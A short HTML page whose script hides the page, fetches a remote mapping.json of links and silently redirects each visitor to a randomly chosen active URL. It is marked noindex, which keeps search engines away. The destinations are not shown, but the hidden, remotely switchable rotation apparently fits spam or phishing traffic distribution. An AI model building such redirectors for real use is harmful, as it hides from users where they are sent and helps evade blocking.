<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      overflow: hidden;
      display: none;
    }
  </style>

  <script>
    (async () => {
      const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";

      try {
        // 强制拉最新 JSON
        const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
        if (!res.ok) throw new Error("mapping.json not found");

        const data = await res.json();
        if (!data || !Array.isArray(data.links)) throw new Error("Invalid mapping structure");

        // 只使用最新数据，不使用缓存
        const activeLinks = data.links.filter(l => l.active);
        if (!activeLinks.length) throw new Error("No active links");

        const idx = Math.floor(Math.random() * activeLinks.length);
        location.replace(activeLinks[idx].url);
        return;

      } catch (e) {
        console.error("Redirect failed:", e);
      }

      // 失败时不使用缓存，直接显示空页
      document.body.style.display = "block";
      document.body.innerHTML = `
        <h2 style="font-family: sans-serif; padding: 20px;">
          Please try again later.
        </h2>
      `;
    })();
  </script>
</head>
<body></body>
</html>
